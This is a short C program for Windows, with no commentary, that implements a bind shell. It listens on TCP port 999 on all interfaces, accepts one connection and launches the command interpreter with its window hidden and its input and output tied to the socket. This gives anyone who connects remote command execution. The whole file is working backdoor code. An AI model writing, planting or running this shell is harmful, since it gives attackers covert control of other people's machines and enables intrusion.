#include <winsock2.h>
#pragma comment(lib, "WS2_32.lib")
#include <tchar.h>

int main(void) {
	WSADATA wsaData;
	sockaddr_in sockaddr;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;

	ZeroMemory(&ProcessInfo,
		sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo,
		sizeof(STARTUPINFO));
	ZeroMemory(&wsaData,
		sizeof(WSADATA));

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	TCHAR szCMDPath[255];
	GetEnvironmentVariable(
		TEXT("COMSPEC"),
		szCMDPath,
		sizeof(szCMDPath));

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(999);
	sockaddr.sin_addr.S_un.S_addr = INADDR_ANY;

	SOCKET CSocket = WSASocket(
		AF_INET,
		SOCK_STREAM,
		IPPROTO_TCP,
		NULL,
		0,
		0);
	bind(CSocket,
		(SOCKADDR*)&sockaddr,
		sizeof(sockaddr));
	listen(CSocket, 1);
	int iAddrSize = sizeof(sockaddr);
	SOCKET SSocket = WSAAccept(
		CSocket,
		(SOCKADDR*)&sockaddr,
		&iAddrSize,
		NULL,
		NULL);

	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags =
		STARTF_USESTDHANDLES |
		STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;

	CreateProcess(NULL,
		szCMDPath,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo);
	closesocket(CSocket);
	closesocket(SSocket);
	WSACleanup();
	return 0;
}
